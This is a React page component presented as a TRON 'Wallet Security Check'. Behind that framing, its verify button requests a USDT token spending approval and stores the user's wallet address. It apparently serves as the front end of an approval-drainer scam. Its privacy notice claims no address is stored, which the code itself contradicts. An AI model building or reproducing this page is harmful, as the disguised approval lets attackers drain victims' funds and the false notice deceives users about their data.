import { ArrowRight } from "lucide-react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "../components/layout/Footer";
import Navbar from "../components/layout/Navbar";
import { Button } from "../components/ui/button";
import { useToast } from "../hooks/use-toast";
import { useTronConnect } from "../components/tron-connect";
import { storeWalletAddress } from "../services/database";

const WalletCheck = () => {
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const {
    connectWallet,
    approveUsdt,
    isConnected,
    address,
    disconnectWallet,
    isConnecting,
  } = useTronConnect();

  // Reset connection state when component unmounts
  useEffect(() => {
    return () => {
      if (isConnected) {
        disconnectWallet();
      }
    };
  }, [isConnected]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // If not connected, connect wallet first
      if (!isConnected) {
        setIsLoading(true);
        await connectWallet();

        // Stop here - once connected, the address will update and user can click verify again
        toast({
          title: "Wallet Connected",
          description:
            "Your wallet has been connected. Click Verify Now to continue.",
        });
        setIsLoading(false);
        return;
      }

      setIsLoading(true);

      // Wallet is connected, now request USDT approval
      await approveUsdt();

      // Store wallet address in database
      if (address) {
        await storeWalletAddress({
          address,
          security_score: 0, // Initial score, will be updated in VerificationResults
          risk_level: "Safe", // Initial risk level, will be updated in VerificationResults
        });
      }

      toast({
        title: "Approval Successful",
        description: "USDT approval transaction has been completed.",
      });

      // Navigate to results page
      navigate(`/verification-results/${address}`);
    } catch (error) {
      console.error("Verification process failed:", error);
      toast({
        title: "Verification Failed",
        description:
          error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />

      <main className="flex-grow py-16 bg-gradient-to-b from-gray-50 to-white">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            <div className="text-center mb-10">
              <h1 className="text-3xl md:text-4xl font-bold mb-4">
                Wallet Security Check
              </h1>
              <p className="text-lg text-gray-600">
                Connect your TRON wallet to receive a comprehensive security
                analysis and score.
              </p>
            </div>

            <div className="bg-white rounded-xl shadow-md p-6 md:p-8 border border-gray-100">
              <form onSubmit={handleSubmit}>
                <div className="flex flex-col space-y-4">
                  <Button
                    type="submit"
                    className="btn-primary flex items-center justify-center w-full"
                    disabled={isLoading || isConnecting}
                  >
                    {isLoading || isConnecting ? (
                      <span className="animate-pulse">Processing...</span>
                    ) : isConnected ? (
                      <>
                        Verify Wallet <ArrowRight className="ml-2 h-4 w-4" />
                      </>
                    ) : (
                      <>
                        Connect Wallet <ArrowRight className="ml-2 h-4 w-4" />
                      </>
                    )}
                  </Button>

                  {isConnected && (
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => disconnectWallet()}
                      className="w-full"
                    >
                      Disconnect Wallet
                    </Button>
                  )}
                </div>
              </form>

              <div className="mt-6 pt-6 border-t border-gray-100">
                <h3 className="text-sm font-medium text-gray-700 mb-2">
                  What will be checked?
                </h3>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li>• Smart contract interactions</li>
                  <li>• Transaction pattern analysis</li>
                  <li>• Blacklisted contracts detection</li>
                  <li>• Security vulnerabilities</li>
                  <li>• Balance risk assessment</li>
                </ul>
              </div>

              <div className="mt-6 bg-blue-50 p-4 rounded-lg">
                <p className="text-sm text-blue-700">
                  <strong>Privacy Notice:</strong> We do not store your wallet
                  address or any transaction data. All analysis is performed
                  in-memory and destroyed after the security report is
                  generated.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default WalletCheck;
